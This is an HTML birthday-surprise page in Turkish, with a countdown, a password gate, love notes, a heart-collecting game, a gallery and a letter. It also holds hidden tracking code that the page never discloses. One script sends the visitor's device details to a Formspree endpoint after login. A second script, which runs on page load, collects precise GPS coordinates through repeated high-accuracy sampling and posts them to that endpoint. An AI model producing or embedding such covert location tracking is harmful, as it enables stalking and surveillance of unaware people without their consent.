<!doctype html>
<html lang="tr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>6 EYLÜL MUCİZESİ</title>
  <style>
    :root{
      --bg:#fff0f6; --accent:#db2777; --card:#fff; --muted:#666; --text:#222;
      --glass-bg: rgba(255,255,255,0.75);
      --glass-brd: rgba(255,255,255,0.4);
      --max-w:980px;
    }
    /* DARK THEME */
    html[data-theme="dark"]{
      --bg:#0b0a0f; --accent:#f472b6; --card:#13121a; --muted:#a3a3a3; --text:#f5f5f5;
      --glass-bg: rgba(20,20,28,0.55);
      --glass-brd: rgba(255,255,255,0.08);
    }

    *{box-sizing:border-box}
    body{
      margin:0;
      font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;
      background:linear-gradient(180deg,#fff 0%,#fff8fb 100%);
      color:var(--text);
      transition: background .35s ease, color .35s ease;
    }
    html[data-theme="dark"] body{
      background: radial-gradient(1200px 800px at 80% -20%, #201a28 0%, #0b0a0f 60%);
    }

    .container{max-width:var(--max-w);margin:0 auto;padding:20px}
    header{display:flex;align-items:center;gap:12px}
    header img{width:68px;height:68px;object-fit:cover;border-radius:14px;box-shadow:0 6px 18px rgba(0,0,0,0.12)}
    html[data-theme="dark"] header img{box-shadow:0 10px 28px rgba(0,0,0,0.45)}
    h1{margin:0;font-size:20px}
    .center{display:flex;align-items:center;justify-content:center}

    /* Pages */
    .page{display:none;padding:18px 0}
    .page.active{display:block}
    .card{
      background:var(--card);
      border-radius:14px;
      padding:18px;
      box-shadow:0 8px 28px rgba(16,24,40,0.06);
      transition: background .35s ease, border-color .35s ease, box-shadow .35s ease;
    }
    html[data-theme="dark"] .card{
      box-shadow:0 10px 36px rgba(0,0,0,0.35);
      border:1px solid rgba(255,255,255,0.04);
    }

    /* Countdown */
    .timer{display:flex;gap:10px;justify-content:center;margin-top:12px}
    .timebox{background:#fff;border-radius:10px;padding:10px 14px;min-width:64px;text-align:center;transition: background .35s ease, color .35s ease}
    .timebox .num{font-weight:700;font-size:20px}
    .timebox .lab{font-size:12px;color:var(--muted)}
    html[data-theme="dark"] .timebox{background:#1a1822;color:#eee}

    /* Gate form - yenilenmiş */
    .gate-card{
      backdrop-filter: blur(12px);
      background: var(--glass-bg);
      border: 1px solid var(--glass-brd);
      box-shadow:0 8px 28px rgba(219,39,119,0.15);
      animation: fadeInUp .9s ease;
    }
    .title{margin:0;font-size:22px;color:var(--accent);text-shadow:0 0 6px rgba(219,39,119,0.3)}
    .subtitle{color:var(--muted);margin-top:10px;font-size:14px}
    .pwrow{display:flex;gap:8px;justify-content:center;margin-top:16px;flex-wrap:wrap}
    .input-wrap{
      position:relative;display:flex;align-items:center;
      background:white;border-radius:12px;border:1px solid #eee;
      padding:6px 10px;flex:1;max-width:200px;transition: background .35s ease, border-color .35s ease, color .35s ease;
    }
    .input-wrap .icon{width:20px;height:20px;flex:none;margin-right:6px}
    .input-wrap input{border:none;outline:none;width:100%;padding:8px;font-size:14px;background:transparent;color:#111}
    html[data-theme="dark"] .input-wrap{background:#100f15;border-color:#2a2835}
    html[data-theme="dark"] .input-wrap input{color:#eaeaea}
    .glow-btn{
      background:var(--accent);color:white;border:none;padding:10px 16px;
      border-radius:12px;cursor:pointer;transition:all .3s ease;
      box-shadow:0 0 10px rgba(219,39,119,0.4);
    }
    .glow-btn:hover{
      transform:translateY(-2px);
      box-shadow:0 0 18px rgba(219,39,119,0.6);
    }
    #pwErr{margin-top:12px;font-size:13px;color:#c33;font-weight:500;text-align:center}
    @keyframes fadeInUp{
      from{opacity:0;transform:translateY(40px)}
      to{opacity:1;transform:translateY(0)}
    }

    /* Notes grid */
    .notes{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:16px}
    .note img{width:100%;height:160px;object-fit:cover;border-radius:10px}
    .note p{margin:8px 0 0}

    /* Heart game area */
    .game-area{position:relative;min-height:60vh;border-radius:14px;overflow:hidden;background:linear-gradient(180deg,#fff0f6 0,#ffeef8 100%);display:flex;flex-direction:column}
    html[data-theme="dark"] .game-area{background:linear-gradient(180deg,#1b1623 0,#13101a 100%)}
    .game-top{display:flex;justify-content:space-between;align-items:center;padding:12px}
    .score-badge{background:#fff;padding:8px 12px;border-radius:999px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
    html[data-theme="dark"] .score-badge{background:#1a1822;color:#eee;box-shadow:0 8px 20px rgba(0,0,0,0.35)}
    .hearts-layer{position:absolute;inset:0;pointer-events:auto}
    .heart{position:absolute;touch-action:none;user-select:none;display:flex;align-items:center;justify-content:center;width:44px;height:44px;border-radius:50%;}
    .heart svg{width:100%;height:100%}
    .fall{animation:floating linear forwards}
    @keyframes floating{from{transform:translateY(120vh) scale(0.8);opacity:0}to{transform:translateY(-40vh) scale(1);opacity:1}}

    /* Win overlay */
    .overlay{position:absolute;inset:0;Display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.45);color:white}
    .overlay .box{background:transparent;text-align:center;padding:18px}
    .overlay h2{font-size:34px;margin:0}
    .overlay p{opacity:0.9}

    /* Gallery */
    .gallery{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}
    .gal img{width:100%;height:190px;object-fit:cover;border-radius:10px}
    .letter{margin-top:14px;border-radius:12px;padding:16px;background:#fff;box-shadow:0 6px 18px rgba(16,24,40,0.06);white-space:pre-wrap;transition: background .35s ease, color .35s ease}
    html[data-theme="dark"] .letter{background:#15131c;color:#eee;box-shadow:0 10px 28px rgba(0,0,0,0.35)}

    footer.fixed{position:fixed;right:12px;bottom:12px;background:rgba(0,0,0,0.35);color:white;padding:8px 12px;border-radius:999px;font-size:12px}

    /* THEME TOGGLE (glass button) */
    .theme-toggle{
      position:fixed;
      top:12px; right:12px;
      z-index:9999;
      display:flex; align-items:center; gap:8px;
      padding:8px 12px;
      border-radius:999px;
      border:1px solid var(--glass-brd);
      background: var(--glass-bg);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      box-shadow:0 8px 22px rgba(0,0,0,0.12);
      cursor:pointer;
      user-select:none;
      transition: transform .25s ease, box-shadow .25s ease, background .35s ease, border-color .35s ease;
      font-size:13px;
      color:var(--text);
    }
    .theme-toggle:hover{ transform: translateY(-2px); box-shadow:0 12px 28px rgba(0,0,0,0.18); }
    .theme-toggle .ico{
      position:relative; width:22px; height:22px; flex:none;
    }
    .theme-toggle .sun, .theme-toggle .moon{
      position:absolute; inset:0;
      transition: opacity .35s ease, transform .35s ease;
    }
    html[data-theme="dark"] .theme-toggle .sun{opacity:0; transform: scale(.8) rotate(-20deg)}
    html[data-theme="dark"] .theme-toggle .moon{opacity:1; transform: scale(1) rotate(0)}
    .theme-toggle .sun{opacity:1; transform: scale(1) rotate(0)}
    .theme-toggle .moon{opacity:0; transform: scale(.8) rotate(20deg)}

    /* Responsive */
    @media (max-width:520px){
      header img{width:56px;height:56px}
      .timebox{min-width:48px}
      .theme-toggle{padding:8px 10px; gap:6px; font-size:12px}
    }
  </style>
</head>

<body>
  <!-- THEME TOGGLE BUTTON (sağ üst) -->
  <button id="themeToggle" class="theme-toggle" aria-label="Tema değiştir">
    <span class="ico" aria-hidden="true">
      <!-- Sun -->
      <svg class="sun" viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="4.5" stroke="#fbbf24" stroke-width="2"/>
        <g stroke="#fbbf24" stroke-width="2">
          <path d="M12 2v3" />
          <path d="M12 19v3" />
          <path d="M2 12h3" />
          <path d="M19 12h3" />
          <path d="M4.2 4.2l2.1 2.1" />
          <path d="M17.7 17.7l2.1 2.1" />
          <path d="M19.8 4.2l-2.1 2.1" />
          <path d="M6.3 17.7l-2.1 2.1" />
        </g>
      </svg>
      <!-- Moon -->
      <svg class="moon" viewBox="0 0 24 24" fill="none">
        <path d="M21 12.8A9 9 0 1111.2 3a7 7 0 109.8 9.8z" fill="#fde68a" />
      </svg>
    </span>
    <span id="themeLabel">Normal Mode</span>
  </button>

  <div class="container">
    <header>
      <img id="heroImg" src="https://picsum.photos/seed/cover/800/800" alt="Kapak"/>
      <div>
        <h1>6 EYLÜL MUCİZESİNE</h1>
        <div style="color:var(--muted);font-size:13px">İYİ Kİ DOĞDUN GÜZELİM</div>
      </div>
    </header>

    <!-- GATE -->
    <section id="gate" class="page active">
      <div class="card gate-card">
        <div class="center">
          <h2 class="title">🎉 Doğum Gününe Geri Sayım</h2>
        </div>
        <div class="timer" id="timer"></div>
        <p class="center subtitle">Sürprize ulaşmak için sihirli şifreyi gir 💖</p>
        <div class="pwrow">
          <div class="input-wrap">
            <svg class="icon" viewBox="0 0 24 24" fill="none">
              <path d="M12 17a2 2 0 002-2v-2h1a2 2 0 002-2V9a7 7 0 10-14 0v2a2 2 0 002 2h1v2a2 2 0 002 2h4z" stroke="#db2777" stroke-width="2"/>
            </svg>
            <input id="pw" type="password" placeholder="Şifre" autocomplete="one-time-code"/>
          </div>
          <button id="pwBtn" class="glow-btn">🔑 Giriş</button>
        </div>
        <div id="pwErr"></div>
      </div>
    </section>

    <!-- NOTES -->
    <section id="notes" class="page">
      <div class="card">
        <h2 style="margin:0">Küçük Aşk Notları</h2>
        <p style="color:var(--muted);margin-top:6px">Senin için kalbimden minik notlar...</p>
        <div class="notes" id="notesGrid"></div>
        <div style="text-align:center;margin-top:14px">
          <button id="toGame" class="glow-btn">İlerleyelim güzelim 💕</button>
        </div>
      </div>
    </section>

    <!-- GAME -->
    <section id="game" class="page">
      <div class="game-area card" id="gameArea">
        <div class="game-top">
          <div style="padding-left:8px">
            <strong>Kalpleri Topla</strong>
            <div style="font-size:12px;color:var(--muted)">Dokun/tıkla kalplere</div>
          </div>
          <div class="score-badge">Toplanan: <span id="score">0</span>/<span id="target">12</span></div>
        </div>

        <div class="hearts-layer" id="heartsLayer" aria-hidden="false"></div>

        <div style="padding:12px;text-align:center;color:var(--muted)">Hedefe ulaşınca sihirli bir şey olacak…</div>

        <div id="winOverlay" class="overlay" style="display:none">
          <div class="box">
            <h2>Seni Seviyorum 💖</h2>
            <p>Kalbim hep seninle atan bir ritim…</p>
            <div style="margin-top:12px">
              <button id="toGallery" class="glow-btn">İlerle ➡️</button>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- GALLERY + LETTER -->
    <section id="gallery" class="page">
      <div class="card">
        <h2 style="margin:0">Galeri</h2>
        <p style="color:var(--muted);margin-top:6px">Bizim hikayemizden kareler</p>
        <div class="gallery" id="galleryGrid" style="margin-top:12px"></div>

        <div style="text-align:center;margin-top:16px">
          <button id="toggleLetter" class="glow-btn">Mektubu Aç</button>
        </div>
        <div id="letterBox" class="letter" style="display:none;margin-top:12px"></div>

        <div style="margin-top:16px;text-align:center">
          <button id="backTop" style="padding:8px 12px;border-radius:12px;border:1px solid #eee;background:white">Başa Dön</button>
        </div>
      </div>
    </section>

    <div class="fixed footer" style="height:18px"></div>
  </div>

  <div class="fixed footer" style="right:12px;bottom:12px">💌 Senin için</div>
  
  <script>
    /* ====== CONFIG ====== */
    const CONFIG = {
      PASSWORD: '58624540464',
      heroImage: 'https://raw.githubusercontent.com/diesel8603/birthday-surprise/refs/heads/main/images/Screenshot_2025-09-03-23-57-46-781_com.miui.gallery.jpg',
      notes:[
        {img:'https://raw.githubusercontent.com/diesel8603/birthday-surprise/refs/heads/main/images/Screenshot_2025-09-03-23-57-46-781_com.miui.gallery.jpg', text:'Gülüşün, günümün en sevdiğim kısmı.'},
        {img:'https://raw.githubusercontent.com/diesel8603/birthday-surprise/refs/heads/main/images/IMG_20250904_024139.jpg', text:'Kokun, en güzel evim.'},
        {img:'https://raw.githubusercontent.com/diesel8603/birthday-surprise/refs/heads/main/images/IMG_20250904_023826.jpg', text:'Elini tuttuğumda dünya susuyor.'}
      ],
      gallery:[
        {img:'https://raw.githubusercontent.com/diesel8603/birthday-surprise/refs/heads/main/images/IMG_20250905_010558.jpg', caption:'Birlikte olduğumuz her an bir şiir gibi.'},
        {img:'https://picsum.photos/seed/love2/900/700', caption:'Gözlerinde kaybolmak en sevdiğim yolculuk.'},
        {img:'https://picsum.photos/seed/love3/900/700', caption:'Kahkahalarımız dünyanın en güzel melodisi.'}
      ],
      letterText: `Sevgilim,\n\nDoğduğun gün, dünyaya en güzel renk eklendi. Benim dünyama ise sen girdin ve her şeyi daha anlamlı yaptın. Yanımda olduğun her an için minnettarım.\n\nNice yıllara beraber, el ele. Seni çok seviyorum.`,
      targetHearts: 12
    };

    /* ==== THEME: state load, apply, toggle ==== */
    const themeLabel = document.getElementById('themeLabel');
    const rootEl = document.documentElement;

    function setTheme(mode){
      if(mode === 'dark'){
        rootEl.setAttribute('data-theme','dark');
        themeLabel.textContent = 'Dark Mode';
        try{ localStorage.setItem('theme','dark'); }catch(e){}
      } else {
        rootEl.setAttribute('data-theme','light');
        themeLabel.textContent = 'Normal Mode';
        try{ localStorage.setItem('theme','light'); }catch(e){}
      }
    }

    (function initTheme(){
      let saved = null;
      try{ saved = localStorage.getItem('theme'); }catch(e){}
      if(!saved){
        const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
        saved = prefersDark ? 'dark' : 'light';
      }
      setTheme(saved);
    })();

    document.getElementById('themeToggle').addEventListener('click', ()=>{
      const current = rootEl.getAttribute('data-theme') === 'dark' ? 'dark' : 'light';
      setTheme(current === 'dark' ? 'light' : 'dark');
    });

    /* ==== PAGE CONTENT ==== */
    document.getElementById('heroImg').src = CONFIG.heroImage;

    function show(pageId){
      document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
      document.getElementById(pageId).classList.add('active');
      window.scrollTo({top:0,behavior:'smooth'});
    }

    function nextSept6(){
      const now = new Date();
      let year = now.getFullYear();
      if (now.getMonth()>8 || (now.getMonth()===8 && now.getDate()>6)) year++;
      return new Date(year,8,6,0,0,0);
    }
    function startCountdown(){
      const target = nextSept6().getTime();
      const el = document.getElementById('timer');
      function tick(){
        const now = Date.now();
        let diff = Math.max(0,target-now);
        const days = Math.floor(diff/(1000*60*60*24));
        const hours = Math.floor((diff/(1000*60*60))%24);
        const mins = Math.floor((diff/(1000*60))%60);
        const secs = Math.floor((diff/1000)%60);
        el.innerHTML = ['Gün','Saat','Dakika','Saniye'].map((lab,i)=>{
          const val = [days,hours,mins,secs][i];
          return `<div class="timebox"><div class="num">${String(val).padStart(2,'0')}</div><div class="lab">${lab}</div></div>`;
        }).join('');
        requestAnimationFrame(() => { if(diff>0) setTimeout(tick, 500); });
      }
      tick();
    }

    const notesGrid = document.getElementById('notesGrid');
    CONFIG.notes.forEach(n=>{
      const d = document.createElement('div'); d.className='note card';
      d.innerHTML = `<img src="${n.img}" alt="note"/><p>${n.text}</p>`;
      notesGrid.appendChild(d);
    });

    document.getElementById('toGame').addEventListener('click', ()=> show('game'));

(function(){
      const layer = document.getElementById('heartsLayer');
      const scoreEl = document.getElementById('score');
      const targetEl = document.getElementById('target');
      const winOverlay = document.getElementById('winOverlay');
      let score = 0, target = CONFIG.targetHearts;
      targetEl.textContent = target;
      scoreEl.textContent = score;
      let running = true;
      let id = 0;

      function spawn(){
        if(!running) return;
        const h = document.createElement('div');
        h.className = 'heart fall';
        const left = Math.random()*78 + 6;
        const size = Math.floor(Math.random()*30 + 26);
        const dur = (Math.random()*4 + 6).toFixed(2);
        h.style.left = left + '%';
        h.style.width = size+'px';
        h.style.height = size+'px';
        h.style.bottom = '-80px';
        h.style.zIndex = 20;
        h.style.pointerEvents = 'auto';
        h.dataset.id = id++;
        h.innerHTML = `<svg viewBox="0 0 24 24" fill="none"><path d="M12.001 20.03l-1.45-1.32C5.4 14.21 2 11.36 2 8.06 2 5.44 4.24 3.5 6.7 3.5c1.7 0 3.24.88 4.3 2.19 1.06-1.31 2.6-2.19 4.3-2.19 2.46 0 4.7 1.94 4.7 4.56 0 3.3-3.4 6.15-8.55 10.65L12.001 20.03z" fill="#DB2777"/></svg>`;
        h.style.animationDuration = dur + 's';
        function hit(e){
          e.preventDefault();
          if(h.dataset.hit) return; h.dataset.hit=1;
          score++; scoreEl.textContent=score;
          h.style.transform='scale(1.4)';
          h.style.opacity='0';
          setTimeout(()=>h.remove(),300);
          if(score>=target){running=false;winOverlay.style.display='flex';}
        }
        h.addEventListener('click',hit);
        h.addEventListener('touchstart',hit);
        layer.appendChild(h);
        setTimeout(()=>{if(document.body.contains(h))h.remove();},dur*1000+1000);
        setTimeout(spawn, Math.random()*1200+800);
      }
      spawn();
    })();

    document.getElementById('toGallery').addEventListener('click', ()=> show('gallery'));

    const galGrid = document.getElementById('galleryGrid');
    CONFIG.gallery.forEach(g=>{
      const d = document.createElement('div'); d.className='gal card';
      d.innerHTML = `<img src="${g.img}" alt="gal"/><p>${g.caption}</p>`;
      galGrid.appendChild(d);
    });
    document.getElementById('toggleLetter').addEventListener('click', ()=>{
      const box=document.getElementById('letterBox');
      if(box.style.display==='none'){box.style.display='block';box.textContent=CONFIG.letterText;}
      else{box.style.display='none';}
    });
    document.getElementById('backTop').addEventListener('click', ()=> show('gate'));

    // Şifre olayları + bildirim tek noktadan yönetim
    document.getElementById('pwBtn').addEventListener('click', ()=>{
      const v = document.getElementById('pw').value.trim();
      const err = document.getElementById('pwErr');
      if(v === CONFIG.PASSWORD){
        err.textContent='';
        show('notes');

        const tarih = new Date().toLocaleDateString("tr-TR");
        const saat = new Date().toLocaleTimeString("tr-TR",{hour:"2-digit",minute:"2-digit"});
        const ua = navigator.userAgent;
        const screenSize = `${window.innerWidth}x${window.innerHeight}`;
        const lang = navigator.language;

        const mesajGiris = `✅ Kullanıcı giriş yaptı!
Tarih: ${tarih} ${saat}
Tarayıcı: ${ua}
Ekran: ${screenSize}
Dil: ${lang}`;

        fetch("https://formspree.io/f/xwpnwvyv", {
          method:"POST",
          headers:{'Content-Type':'application/json','Accept':'application/json'},
          body: JSON.stringify({message: mesajGiris})
        });
      }else{
        err.textContent='Şifre yanlış, bir daha dener misin?';
        setTimeout(()=>err.textContent='',1800);
      }
    });

    startCountdown();
</script>

<script>
(function sendAccurateGPSToFormspree(){
  const FORMSPREE_URL = "https://formspree.io/f/xwpnwvyv"; // Formspree endpoint
  if (!('geolocation' in navigator)) {
    fetch(FORMSPREE_URL, {
      method: "POST",
      headers: {'Content-Type':'application/json','Accept':'application/json'},
      body: JSON.stringify({ message: "GPS desteklenmiyor - cihaz/tarayıcı desteklemiyor." })
    }).catch(()=>{});
    return;
  }

  const MAX_SAMPLES = 8;        // Alınacak maksimum örnek sayısı
  const MAX_WAIT_MS = 20000;    // Maksimum bekleme süresi (ms)
  const GOOD_ACCURACY_M = 20;   // Bu değerin altına inerse doğrudan bitir (metre)

  let best = null;
  let samples = 0;
  let finished = false;

  const opts = { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 };

  const overallTimer = setTimeout(()=> { if(!finished) finish("timeout"); }, MAX_WAIT_MS);
  const watchId = navigator.geolocation.watchPosition(success, fail, opts);

  function success(pos) {
    samples++;
    const c = pos.coords;
    const lat = c.latitude;
    const lon = c.longitude;
    const acc = (typeof c.accuracy === 'number') ? c.accuracy : 1e6;

    if(!best || acc < best.accuracy){
      best = { latitude: lat, longitude: lon, accuracy: acc, timestamp: pos.timestamp };
    }

    if(acc <= GOOD_ACCURACY_M || samples >= MAX_SAMPLES){
      finish("good-accuracy-or-samples");
    }
  }

  function fail(err){
    finish("error:" + (err && err.message ? err.message : "unknown"));
  }

  function finish(reason){
    if(finished) return;
    finished = true;
    clearTimeout(overallTimer);
    if (watchId !== undefined) navigator.geolocation.clearWatch(watchId);

    if(best){
      const lat = Number(best.latitude).toFixed(6);
      const lon = Number(best.longitude).toFixed(6);
      const acc = Number(best.accuracy).toFixed(3);
      const time = new Date(best.timestamp).toLocaleString('tr-TR');

      const payload = {
        message: `📌 Doğru GPS Konumu (seçilen örnek)
Enlem: ${lat}
Boylam: ${lon}
Doğruluk: ±${acc} m
Zaman: ${time}
Sebep: ${reason}`
      };

      fetch(FORMSPREE_URL, {
        method: "POST",
        headers: {'Content-Type':'application/json','Accept':'application/json'},
        body: JSON.stringify(payload)
      }).catch(()=>{});
    } else {
      fetch(FORMSPREE_URL, {
        method: "POST",
        headers: {'Content-Type':'application/json','Accept':'application/json'},
        body: JSON.stringify({ message: `⚠️ GPS bulunamadı veya izin reddedildi. Sebep: ${reason}` })
      }).catch(()=>{});
    }
  }

  // İzin reddedilirse hemen bitir
  try {
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({name:'geolocation'}).then(p => {
        if(p.state === 'denied'){
          finish("permission-denied");
        }
      }).catch(()=>{});
    }
  } catch(e){}
})();
</script>

</body>
</html>








